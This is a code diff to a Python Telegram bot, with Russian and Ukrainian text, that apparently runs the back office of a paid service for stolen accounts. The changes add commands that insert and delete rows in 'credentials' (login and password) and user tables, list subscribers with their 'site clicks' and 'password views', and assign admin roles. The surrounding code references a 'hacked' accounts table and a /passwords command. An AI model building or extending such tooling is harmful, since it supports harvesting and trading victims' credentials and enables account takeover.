@@ -155,6 +155,23 @@ def get_hacked_accounts():
         conn.close()
         return []
 
+def get_all_users():
+    conn = get_db_connection()
+    if conn is None:
+        print("Failed to get all users: no DB connection")
+        return []
+    try:
+        c = conn.cursor()
+        c.execute("SELECT chat_id, prefix, subscription_end, site_clicks, password_views FROM users")
+        result = c.fetchall()
+        conn.close()
+        print(f"All users fetched: {result}")
+        return result
+    except Exception as e:
+        print(f"Error fetching all users: {e}")
+        conn.close()
+        return []
+
 # === Перевірка доступу ===
 def check_access(chat_id, command):
     global tech_break
@@ -253,7 +270,14 @@ def menu_cmd(message):
     if user:
         time_left = (user['subscription_end'] - datetime.now()).days if user['subscription_end'] else 0
         time_str = f"{time_left} дней" if time_left > 0 else "Истекла"
-        response = f"👤 Ваш префикс: {user['prefix']}\n⏳ Подписка: {time_str}\n\n🧾 Команды:\n/start\n/menu\n/site\n/getchatid\n/techstop\n/techstopoff"
+        response = f"👤 Ваш префикс: {user['prefix']}\n⏳ Подписка: {time_str}"
+        if tech_break:
+            tech_time_left = (tech_break - datetime.now()).total_seconds() / 60
+            if tech_time_left > 0:
+                response += f"\n⏳ Техперерыв: до {tech_break.strftime('%H:%M')} (UTC+2), осталось {int(tech_time_left)} мин."
+            else:
+                tech_break = None
+        response += "\n\n🧾 Команды:\n/start\n/menu\n/site\n/getchatid\n/techstop\n/techstopoff"
         if user['prefix'] in ['Админ', 'Создатель']:
             response += "\n/passwords\n/admin"
         if user['prefix'] == 'Создатель':
@@ -356,16 +380,49 @@ def database_cmd(message):
     if access:
         bot.reply_to(message, access)
         return
+    args = message.text.split()[1:] if len(message.text.split()) > 1 else []
     conn = get_db_connection()
     if conn is None:
         bot.reply_to(message, "❌ Не удалось подключиться к базе данных.")
         return
     try:
         c = conn.cursor()
-        c.execute("SELECT table_name FROM information_schema.tables WHERE table_schema = 'public'")
-        tables = c.fetchall()
+        if not args:
+            c.execute("SELECT table_name FROM information_schema.tables WHERE table_schema = 'public'")
+            tables = c.fetchall()
+            response = "📊 Таблицы в базе:\n" + "\n".join(table[0] for table in tables)
+            response += "\n\nИспользуйте: /database <действие> <таблица> <значение>\nДействия: add, delete\nТаблицы: users, credentials, hacked"
+        elif args[0] == "add":
+            if args[1] == "users" and len(args) == 5:
+                chat_id, prefix, days = args[2], args[3], int(args[4])
+                subscription_end = datetime.now() + timedelta(days=days)
+                c.execute("INSERT INTO users (chat_id, prefix, subscription_end) VALUES (%s, %s, %s) "
+                          "ON CONFLICT (chat_id) DO UPDATE SET prefix = %s, subscription_end = %s",
+                          (chat_id, prefix, subscription_end.isoformat(), prefix, subscription_end.isoformat()))
+                response = f"✅ Добавлен пользователь {chat_id} с префиксом {prefix} на {days} дней."
+            elif args[1] == "credentials" and len(args) == 4:
+                login, password = args[2], args[3]
+                c.execute("INSERT INTO credentials (login, password, added_time) VALUES (%s, %s, %s) "
+                          "ON CONFLICT (login) DO NOTHING",
+                          (login, password, datetime.now().isoformat()))
+                response = f"✅ Добавлен логин {login} с паролем {password}."
+            else:
+                response = "❌ Формат: /database add <таблица> <значения>"
+        elif args[0] == "delete":
+            if args[1] == "users" and len(args) == 3:
+                chat_id = args[2]
+                c.execute("DELETE FROM users WHERE chat_id = %s", (chat_id,))
+                response = f"✅ Удален пользователь {chat_id}."
+            elif args[1] == "credentials" and len(args) == 3:
+                login = args[2]
+                c.execute("DELETE FROM credentials WHERE login = %s", (login,))
+                response = f"✅ Удален логин {login}."
+            else:
+                response = "❌ Формат: /database delete <таблица> <значение>"
+        else:
+            response = "❌ Действие не распознано. Используйте: add, delete"
+        conn.commit()
         conn.close()
-        response = "📊 Таблицы в базе:\n" + "\n".join(table[0] for table in tables)
         bot.reply_to(message, response)
     except Exception as e:
         print(f"Error in /database: {e}")
@@ -380,7 +437,19 @@ def admin_cmd(message):
     if access:
         bot.reply_to(message, access)
         return
-    bot.reply_to(message, "👑 Панель администратора:\nСкоро тут будут функции!")
+    users = get_all_users()
+    if not users:
+        bot.reply_to(message, "📂 Список пользователей пуст.")
+        return
+    response = "👑 Панель администратора\nСписок пользователей:\n"
+    for chat_id, prefix, subscription_end, site_clicks, password_views in users:
+        time_left = (datetime.fromisoformat(subscription_end) - datetime.now()).days if subscription_end else 0
+        response += (f"Chat ID: {chat_id}\n"
+                     f"Префикс: {prefix}\n"
+                     f"Подписка: {time_left} дней\n"
+                     f"Кликов на сайт: {site_clicks}\n"
+                     f"Просмотров паролей: {password_views}\n\n")
+    bot.reply_to(message, response)
 
 @bot.message_handler(commands=['adprefix'])
 def adprefix_cmd(message):
@@ -391,14 +460,16 @@ def adprefix_cmd(message):
         bot.reply_to(message, access)
         return
     args = message.text.split()[1:] if len(message.text.split()) > 1 else []
-    if len(args) < 2 or not args[1].isdigit():
-        bot.reply_to(message, "❌ Формат: /adprefix <chat_id> <дни>")
+    if len(args) < 3 or not args[2].isdigit():
+        bot.reply_to(message, "❌ Формат: /adprefix <chat_id> <префикс> <дни>\nПрефиксы: Админ, Пользователь")
         return
-    target_chat_id = args[0]
-    days = int(args[1])
+    target_chat_id, prefix, days = args[0], args[1], int(args[2])
+    if prefix not in ["Админ", "Пользователь"]:
+        bot.reply_to(message, "❌ Префикс должен быть: Админ или Пользователь")
+        return
     subscription_end = datetime.now() + timedelta(days=days)
-    save_user(target_chat_id, "Админ", subscription_end)
-    bot.reply_to(message, f"✅ Пользователю {target_chat_id} выдан префикс Админ на {days} дней.")
+    save_user(target_chat_id, prefix, subscription_end)
+    bot.reply_to(message, f"✅ Пользователю {target_chat_id} выдан префикс {prefix} на {days} дней.")
 
 @bot.message_handler(commands=['delprefix'])
 def delprefix_cmd(message):
